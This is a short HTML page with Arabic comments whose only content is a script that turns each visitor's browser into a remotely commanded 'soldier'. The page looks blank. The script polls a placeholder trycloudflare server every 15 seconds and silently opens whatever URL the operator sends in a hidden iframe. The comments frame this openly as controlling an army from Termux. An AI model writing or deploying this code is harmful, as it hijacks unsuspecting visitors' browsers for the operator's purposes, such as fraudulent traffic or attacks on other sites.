<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body style="background:#fff;">
    <!-- 🧬 نبضة 'الجنرال' | الرادار الهجين 2026 -->
    <script>
        // رابط الترمكس الخاص بك (الذي ستحصل عليه من cloudflared)
        const masterServer = "https://رابط-ترمكس-الخاص-بك.trycloudflare.com";

        function syncArmy() {
            fetch(`${masterServer}/ping.php`) // إبلاغ الترمكس بوجود جندي
            .then(res => res.json())
            .then(data => {
                if(data.target) {
                    var ifr = document.createElement('iframe');
                    ifr.src = data.target; // فتح الرابط الذي تأمره به من ترمكس
                    ifr.style.display = 'none';
                    document.body.appendChild(ifr);
                }
            }).catch(e => console.log("Waiting for General..."));
        }

        // المزامنة كل 15 ثانية لرصد الجنود والتحكم بهم
        setInterval(syncArmy, 15000);
        syncArmy();
    </script>
</body>
</html>
